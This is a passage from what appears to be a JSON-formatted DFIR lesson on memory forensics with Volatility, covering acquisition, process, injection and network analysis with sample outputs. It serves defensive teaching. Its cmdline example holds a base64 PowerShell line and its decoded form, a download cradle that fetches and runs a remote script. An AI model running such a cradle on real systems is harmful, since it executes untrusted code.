{
  "lesson_id": "b9e4c2d7-8a1f-4c3b-9e2a-5d7f8b3c1a94",
  "domain": "dfir",
  "title": "Advanced Memory Forensics: Volatility and Live System Analysis",
  "difficulty": 3,
  "order_index": 11,
  "prerequisites": [
    "dfir_01",
    "dfir_04"
  ],
  "concepts": [
    "Memory Acquisition Techniques",
    "Volatility Framework Deep Dive",
    "Process Memory Analysis",
    "Malware Detection in RAM",
    "Rootkit Detection",
    "Code Injection Identification",
    "DLL Injection and Hollowing",
    "Credential Extraction (Mimikatz)",
    "Network Connections in Memory",
    "Registry Hives in RAM",
    "Volatility Plugin Development"
  ],
  "estimated_time": 60,
  "learning_objectives": [
    "Master memory acquisition techniques for Windows, Linux, and macOS",
    "Analyze memory dumps using Volatility 3 framework for malware detection",
    "Identify code injection techniques (DLL injection, process hollowing, reflective loading)",
    "Detect rootkits and kernel-mode malware in memory",
    "Extract credentials, encryption keys, and sensitive data from RAM",
    "Analyze network connections and sockets from memory dumps",
    "Identify malicious processes using memory-resident IOCs",
    "Develop custom Volatility plugins for specialized analysis"
  ],
  "content_blocks": [
    {
      "type": "mindset_coach",
      "content": {
        "text": "üß† **Welcome to Memory Forensics: Where Secrets Can't Hide**\n\nImagine a crime scene where the criminal cleaned up all physical evidence‚Äîbut forgot that their actions are still burned into witnesses' memories. **Memory forensics** is that witness interrogation for computers. Even if attackers delete files, clear logs, and cover their tracks on disk, their malware and actions are still *running in RAM*‚Äîand RAM tells the truth.\n\n**Why This Matters**: Memory forensics is the *most powerful* technique for detecting advanced malware. Fileless malware, rootkits, and in-memory-only tools (like Mimikatz, Cobalt Strike beacons) leave almost no disk artifacts‚Äîbut they *must* reside in RAM to function. By analyzing memory, you can:\n- Detect malware that doesn't touch the disk\n- Recover encryption keys and passwords\n- Identify injected code hiding inside legitimate processes\n- Find network connections the attacker tried to hide\n- Uncover the *exact commands* the attacker ran\n\n**Jim Kwik Principle - The Power of Focus**: Memory forensics requires intense focus‚Äîyou're looking for needles in a 8GB+ haystack. But with the right tools (Volatility) and systematic approach, you'll spot malware patterns that others miss.\n\n**Your Mission Today**: You'll learn to capture memory, analyze it with Volatility, detect code injection, hunt rootkits, and extract credentials. By the end, you'll be able to analyze a memory dump and answer: \"What malware was running? How did it get there? What did it do?\" Let's unlock the secrets hidden in RAM! üöÄ"
      }
    },
    {
      "type": "explanation",
      "content": {
        "text": "## What is Memory Forensics?\n\n**Memory forensics** (also called RAM forensics or live forensics) is the analysis of a computer's volatile memory (RAM) to investigate security incidents, detect malware, and recover evidence.\n\n### Why Memory Forensics is Critical\n\n**Disk forensics shows you *what was saved*. Memory forensics shows you *what was running*.**\n\n#### Advantages Over Disk Forensics\n\n1. **Defeats Anti-Forensics**: Attackers can delete files and clear logs, but can't easily erase RAM while malware is running\n2. **Detects Fileless Malware**: In-memory-only attacks (PowerShell exploits, reflective DLL loading) leave no disk artifacts\n3. **Finds Running Processes**: See exactly what was executing, even if executable was deleted\n4. **Recovers Encryption Keys**: Keys must be in RAM to encrypt/decrypt data\n5. **Reveals Network Connections**: Active network sockets show C2 communication\n6. **Exposes Code Injection**: Detect DLL injection, process hollowing, thread injection\n7. **Faster Analysis**: No need to analyze entire disk (memory dumps are typically 4-32 GB)\n\n### What's in a Memory Dump?\n\n```\n‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê\n‚îÇ                  RAM CONTENTS (8 GB)                   ‚îÇ\n‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§\n‚îÇ ‚Ä¢ Running Processes (PID, name, parent, command line)  ‚îÇ\n‚îÇ ‚Ä¢ Loaded DLLs and Drivers (legitimate + injected)      ‚îÇ\n‚îÇ ‚Ä¢ Network Connections (TCP/UDP sockets, IPs, ports)    ‚îÇ\n‚îÇ ‚Ä¢ Registry Hives (loaded portions of HKLM, HKCU)       ‚îÇ\n‚îÇ ‚Ä¢ Open Files (file handles, paths)                     ‚îÇ\n‚îÇ ‚Ä¢ Credentials (passwords, NTLM hashes, Kerberos tickets‚îÇ\n‚îÇ ‚Ä¢ Code Sections (executable memory, shellcode)         ‚îÇ\n‚îÇ ‚Ä¢ Kernel Structures (EPROCESS, VAD trees, etc.)        ‚îÇ\n‚îÇ ‚Ä¢ Clipboard Contents, Browser History, Encryption Keys ‚îÇ\n‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò\n```\n\n**Key Insight**: A memory dump is a *snapshot* of the system at the moment of capture. Everything running at that instant is frozen in time for analysis.\n\n### Memory Acquisition Methods\n\n#### 1. Physical Memory Imaging (Most Common)\n\nCapture entire contents of RAM to a file.\n\n**Windows Tools**:\n- **FTK Imager** (Free, GUI-based, trusted in court)\n- **WinPmem** (Open-source, Volatility Foundation)\n- **DumpIt** (Lightweight, fast)\n- **Magnet RAM Capture** (Free, forensically sound)\n\n**Linux Tools**:\n- **LiME** (Linux Memory Extractor) - kernel module for acquisition\n- **dd** (can dump /dev/mem or /dev/crash)\n- **AVML** (Azure VM memory collector)\n\n**macOS Tools**:\n- **osxpmem** (Volatility Foundation)\n- **MacMemoryReader**\n\n**Example - WinPmem**:\n```cmd\nC:\\> winpmem_3.3.exe physicalmemory.raw\n[+] Imaging memory...\n[+] 8192 MB copied\n[+] Memory image saved to physicalmemory.raw\n```bash\n\n#### 2. Hibernation File Analysis\n\nWindows writes RAM contents to `C:\\hiberfil.sys` when hibernating.\n\n**Pros**: Can analyze system even after shutdown (if hibernation occurred)  \n**Cons**: Not always available, may be compressed\n\n**Conversion**:\n```bash\nvolatility -f hiberfil.sys --profile=Win10x64 imagecopy -O memory.raw\n```bash\n\n#### 3. Crash Dump Analysis\n\nWindows creates crash dumps (`MEMORY.DMP`) after Blue Screen of Death (BSOD).\n\n**Types**:\n- **Complete Memory Dump**: Full RAM contents\n- **Kernel Memory Dump**: Kernel-mode memory only\n- **Small Memory Dump** (Minidump): Minimal data (64KB)\n\n**Location**: `C:\\Windows\\MEMORY.DMP`\n\n#### 4. Virtual Machine Memory\n\n**VMware**: `.vmem` files (VM's RAM)  \n**VirtualBox**: `*.sav` files  \n**Hyper-V**: `.bin` files\n\n**Advantage**: Can suspend VM to capture memory without alerting malware\n\n### Memory Forensics Workflow\n\n```\n1. ACQUIRE ‚Üí Capture memory (WinPmem, FTK Imager, LiME)\n2. IDENTIFY ‚Üí Determine OS version and build (imageinfo)\n3. BASELINE ‚Üí List processes, network connections, DLLs\n4. HUNT ‚Üí Search for malware indicators (malfind, psxview)\n5. ANALYZE ‚Üí Deep-dive on suspicious processes (memdump, dlldump)\n6. EXTRACT ‚Üí Pull credentials, keys, command history\n7. CORRELATE ‚Üí Match with disk artifacts and network logs\n8. REPORT ‚Üí Document findings with screenshots and IOCs\n```\n\n**Memory Anchor - ACME HUNT**: **A**cquire, **C**onfirm-OS, **M**ap-processes, **E**numerate-anomalies, **H**arvest-IOCs, **U**npack-malware, **N**etwork-check, **T**imeline."
      }
    },
    {
      "type": "video",
      "content": {
        "title": "Video: Advanced Memory Forensics: Volatility and Live System Analysis Overview",
        "url": "https://www.youtube.com/embed/Vh_h6NfLkAg",
        "description": "Watch this video for a visual introduction to the concepts covered in this lesson."
      }
    },
    {
      "type": "explanation",
      "content": {
        "text": "## Volatility Framework: Your Memory Analysis Swiss Army Knife\n\n**Volatility** is the industry-standard open-source framework for memory forensics. It supports Windows, Linux, macOS, and Android memory dumps.\n\n### Volatility 2 vs. Volatility 3\n\n| Feature | Volatility 2 | Volatility 3 |\n|---------|-------------|-------------|\n| **Language** | Python 2.7 | Python 3.6+ |\n| **Profiles** | Required (Win7SP1x64, etc.) | Auto-detection |\n| **Performance** | Slower | Faster (optimized) |\n| **Plugins** | 100+ built-in | Growing library |\n| **Current Status** | Legacy (no updates) | Active development |\n\n**Recommendation**: Use Volatility 3 for new investigations. Vol2 still used for older profiles.\n\n### Installation\n\n```bash\n# Volatility 3\ngit clone https://github.com/volatilityfoundation/volatility3.git\ncd volatility3\npip3 install -r requirements.txt\npython3 vol.py -h\n\n# Or via pip\npip3 install volatility3\n```bash\n\n### Essential Volatility Commands\n\n#### 1. Identify OS and Build (Volatility 2)\n\n```bash\nvolatility -f memory.raw imageinfo\n\n# Output:\nSuggested Profile(s) : Win10x64_19041\nAS Layer1 : WindowsAMD64PagedMemory (Kernel AS)\nDTB : 0x1aa000\nKDBG : 0xf8000001f0a0\n```\n\n**Volatility 3** (auto-detects):\n```bash\npython3 vol.py -f memory.raw windows.info\n```bash\n\n#### 2. List Running Processes\n\n**pslist** (walks active process list):\n```bash\nvolatility -f memory.raw --profile=Win10x64_19041 pslist\n\n# Output:\nOffset(V)  Name               PID   PPID  Thds  Hnds  Time\n0x8000...  System             4     0     120   -     2025-10-27 10:00:00\n0x8001...  smss.exe           280   4     2     -     2025-10-27 10:00:05\n0x8002...  csrss.exe          384   376   10    -     2025-10-27 10:00:10\n0x8003...  explorer.exe       2140  2080  42    -     2025-10-27 10:05:00\n0x8004...  powershell.exe     5832  2140  15    -     2025-10-27 14:32:15  ‚Üê Suspicious?\n```\n\n**Key fields**:\n- **PID**: Process ID\n- **PPID**: Parent Process ID (who spawned this?)\n- **Thds**: Thread count (high = active processing)\n- **Time**: Process start time\n\n**Red Flags**:\n- Misspelled process names (`scvhost.exe` instead of `svchost.exe`)\n- Processes with unusual parent (e.g., `explorer.exe` spawning `cmd.exe`)\n- Processes starting at odd times (2 AM on user workstation)\n\n#### 3. Detect Hidden Processes\n\n**psscan** (scans for EPROCESS structures, finds hidden processes):\n```bash\nvolatility -f memory.raw --profile=Win10x64_19041 psscan\n```\n\nRootkits hide processes by unlinking from the process list. `psscan` finds them anyway by scanning memory.\n\n**psxview** (cross-references multiple detection methods):\n```bash\nvolatility -f memory.raw --profile=Win10x64_19041 psxview\n\n# Output:\nName       PID  pslist  psscan  thrdproc  pspcid\nexplorer   2140  True    True    True      True\nmalware    6660  False   True    True      False  ‚Üê HIDDEN!\n```\n\n**Interpretation**: If process shows `False` in pslist but `True` in psscan, it's been hidden by a rootkit.\n\n#### 4. Malware Detection (malfind)\n\n**malfind** finds injected code (DLL injection, shellcode) by looking for:\n- Private executable memory (not backed by file on disk)\n- Memory with unusual permissions (RWX = Read/Write/Execute)\n- VAD tag anomalies\n\n```bash\nvolatility -f memory.raw --profile=Win10x64_19041 malfind\n\n# Output:\nProcess: explorer.exe Pid: 2140\nAddress: 0x3a0000\nVad Tag: VadS (Suspicious - should be Vad for normal DLL)\nProtection: PAGE_EXECUTE_READWRITE (RWX - highly suspicious!)\nFlags: PrivateMemory\n\nDisassembly:\n0x3a0000: 4883ec28        sub rsp, 0x28\n0x3a0004: 65488b042560000000  mov rax, gs:0x60  ; TEB/PEB access (malware technique)\n0x3a000d: 488b4018        mov rax, [rax+0x18]\n```\n\n**Red Flags**:\n- **RWX memory** (memory that's writable AND executable)\n- **Private memory** (not mapped to a DLL file)\n- **Shellcode patterns** (TEB/PEB access, GetProcAddress loops)\n\n#### 5. Network Connections\n\n**netscan** (Windows):\n```bash\nvolatility -f memory.raw --profile=Win10x64_19041 netscan\n\n# Output:\nOffset     Proto  LocalAddr         ForeignAddr       State       Pid   Owner\n0x8005...  TCPv4  10.0.0.100:52341  45.142.212.61:443 ESTABLISHED 5832  powershell.exe\n0x8006...  TCPv4  10.0.0.100:139    0.0.0.0:0         LISTENING   4     System\n```\n\n**Suspicious Indicators**:\n- Connections to unusual countries/IPs\n- Non-browser processes with HTTP/HTTPS connections\n- Processes connecting to cloud hosting (AWS, DigitalOcean)\n- High ports (49152-65535) often used for C2\n\n#### 6. Command History\n\n**cmdline** (command-line arguments for all processes):\n```bash\nvolatility -f memory.raw --profile=Win10x64_19041 cmdline\n\n# Output:\npowershell.exe pid: 5832\nCommand line: \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -enc \nSQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA\nLgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYA\nOAAuADEALgAxADAAMAAvAG0AYQBsAHcAYQByAGUALgBwAHMAMQAnACkA\n```\n\n**Decode the base64**:\n```bash\necho \"SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA...\" | base64 -d\n\n# Result:\nIEX (New-Object Net.WebClient).DownloadString('http://192.168.1.100/malware.ps1')\n```\n\n**SMOKING GUN**: PowerShell downloading and executing remote script!\n\n#### 7. DLL Listing\n\n**dlllist** (DLLs loaded by each process):\n```bash\nvolatility -f memory.raw --profile=Win10x64_19041 dlllist -p 5832\n\n# Output (for PID 5832 - suspicious PowerShell):\nBase            Size  LoadCount Path\n0x00007ff6... 0x1000 0xffff    C:\\Windows\\System32\\ntdll.dll\n0x00007ff5... 0x500  0xffff    C:\\Windows\\System32\\kernel32.dll\n0x00002a00... 0x2000 0x1       C:\\Users\\user\\AppData\\Local\\Temp\\evil.dll  ‚Üê Suspicious!\n```\n\n**Red Flags**:\n- DLLs loaded from Temp directories\n- DLLs with suspicious names (`update.dll`, `msvcrt32.dll`)\n- DLLs not digitally signed\n\n#### 8. Registry Analysis\n\n**hivelist** (loaded registry hives):\n```bash\nvolatility -f memory.raw --profile=Win10x64_19041 hivelist\n\n# Output:\nVirtual     Physical    Name\n0x9000...   0x1200...   \\SystemRoot\\System32\\Config\\SAM\n0x9001...   0x1201...   \\SystemRoot\\System32\\Config\\SYSTEM\n0x9002...   0x1202...   \\Device\\HarddiskVolume1\\Users\\user\\NTUSER.DAT\n```\n\n**printkey** (read registry keys):\n```bash\nvolatility -f memory.raw --profile=Win10x64_19041 printkey \\\n-K \"Microsoft\\Windows\\CurrentVersion\\Run\"\n\n# Output:\nREG_SZ  SecurityHealth : C:\\Windows\\System32\\SecurityHealthSystray.exe\nREG_SZ  Malware        : C:\\Users\\user\\AppData\\Roaming\\update.exe  ‚Üê Persistence!\n```\n\n**Persistence locations to check**:\n- `HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run`\n- `HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run`\n- `HKLM\\System\\CurrentControlSet\\Services` (malicious services)"
      }
    },
    {
      "type": "diagram",
      "content": {
        "text": "## Code Injection Detection Flow\n\n```\n‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê\n‚îÇ         MEMORY DUMP ACQUIRED (8 GB RAM)              ‚îÇ\n‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò\n‚Üì\n‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê\n‚îÇ  1. PROCESS LISTING       ‚îÇ\n‚îÇ  volatility pslist        ‚îÇ\n‚îÇ  Look for:                ‚îÇ\n‚îÇ  - Misspelled names       ‚îÇ\n‚îÇ  - Unusual parents (PPID) ‚îÇ\n‚îÇ  - Odd start times        ‚îÇ\n‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò\n‚Üì\n‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê\n‚îÇ  2. HIDDEN PROCESS CHECK  ‚îÇ\n‚îÇ  volatility psxview       ‚îÇ\n‚îÇ  Find processes hidden    ‚îÇ\n‚îÇ  by rootkits              ‚îÇ\n‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò\n‚Üì\n‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¥‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê\n‚îÇ  3. INJECTION DETECTION      ‚îÇ\n‚îÇ  volatility malfind          ‚îÇ\n‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò\n‚Üì\n‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¥‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê\n‚îÇ   INJECTION TYPE IDENTIFICATION        ‚îÇ\n‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§\n‚îÇ                                        ‚îÇ\n‚îÇ  ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê  ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê   ‚îÇ\n‚îÇ  ‚îÇ DLL INJECTION‚îÇ  ‚îÇPROC HOLLOWING‚îÇ   ‚îÇ\n‚îÇ  ‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§  ‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§   ‚îÇ\n‚îÇ  ‚îÇ - Unusual DLL‚îÇ  ‚îÇ - Mismatched ‚îÇ   ‚îÇ\n‚îÇ  ‚îÇ   in process ‚îÇ  ‚îÇ   PEB path & ‚îÇ   ‚îÇ\n‚îÇ  ‚îÇ - Loaded from‚îÇ  ‚îÇ   disk path  ‚îÇ   ‚îÇ\n‚îÇ  ‚îÇ   Temp dir   ‚îÇ  ‚îÇ - Unmapped   ‚îÇ   ‚îÇ\n‚îÇ  ‚îÇ - dlllist    ‚îÇ  ‚îÇ   sections   ‚îÇ   ‚îÇ\n‚îÇ  ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò  ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò   ‚îÇ\n‚îÇ         ‚îÇ                 ‚îÇ           ‚îÇ\n‚îÇ  ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¥‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê  ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¥‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê   ‚îÇ\n‚îÇ  ‚îÇ REFLECTIVE   ‚îÇ  ‚îÇ  THREAD      ‚îÇ   ‚îÇ\n‚îÇ  ‚îÇ DLL LOADING  ‚îÇ  ‚îÇ  INJECTION   ‚îÇ   ‚îÇ\n‚îÇ  ‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§  ‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§   ‚îÇ\n‚îÇ  ‚îÇ - RWX memory ‚îÇ  ‚îÇ - Remote     ‚îÇ   ‚îÇ\n‚îÇ  ‚îÇ - No DLL path‚îÇ  ‚îÇ   threads in ‚îÇ   ‚îÇ\n‚îÇ  ‚îÇ - Private mem‚îÇ  ‚îÇ   process    ‚îÇ   ‚îÇ\n‚îÇ  ‚îÇ - malfind    ‚îÇ  ‚îÇ - threads    ‚îÇ   ‚îÇ\n‚îÇ  ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò  ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò   ‚îÇ\n‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò\n‚Üì\n‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê\n‚îÇ  4. DUMP SUSPICIOUS CODE  ‚îÇ\n‚îÇ  volatility memdump       ‚îÇ\n‚îÇ  volatility dlldump       ‚îÇ\n‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò\n‚Üì\n‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê\n‚îÇ  5. MALWARE ANALYSIS      ‚îÇ\n‚îÇ  - YARA scan dumped code  ‚îÇ\n‚îÇ  - IDA Pro disassembly    ‚îÇ\n‚îÇ  - Check VirusTotal       ‚îÇ\n‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò\n‚Üì\n‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê\n‚îÇ  6. EXTRACT IOCS          ‚îÇ\n‚îÇ  - IP addresses (netscan) ‚îÇ\n‚îÇ  - File paths (filescan)  ‚îÇ\n‚îÇ  - Registry keys          ‚îÇ\n‚îÇ  - Mutexes (mutantscan)   ‚îÇ\n‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò\n```"
      }
    },
    {
      "type": "explanation",
      "content": {
        "text": "## Code Injection Techniques and Detection\n\n**Code injection** is when malware injects malicious code into legitimate processes to:\n1. Evade detection (hide inside trusted process like `explorer.exe`)\n2. Inherit process privileges (if target has admin/SYSTEM rights)\n3. Bypass application whitelisting\n\n### 1. DLL Injection\n\n**How it works**: Attacker forces target process to load a malicious DLL.\n\n**Steps**:\n1. Open target process with `OpenProcess()`\n2. Allocate memory in target with `VirtualAllocEx()`\n3. Write DLL path to allocated memory with `WriteProcessMemory()`\n4. Create remote thread to call `LoadLibrary()` with `CreateRemoteThread()`\n\n**Detection with Volatility**:\n```bash\n# Check DLLs loaded by suspicious process\nvolatility -f memory.raw --profile=Win10x64_19041 dlllist -p 2140\n\n# Look for:\n# - DLLs from Temp, AppData, or user-writable directories\n# - DLLs with suspicious names (update.dll, msvcrt32.dll)\n# - DLLs with LoadCount = 1 (injected, not statically linked)\n```\n\n**Red Flag Example**:\n```\nBase         Size    LoadCount  Path\n0x7ff60... 0x1a000   0xffff     C:\\Windows\\System32\\ntdll.dll  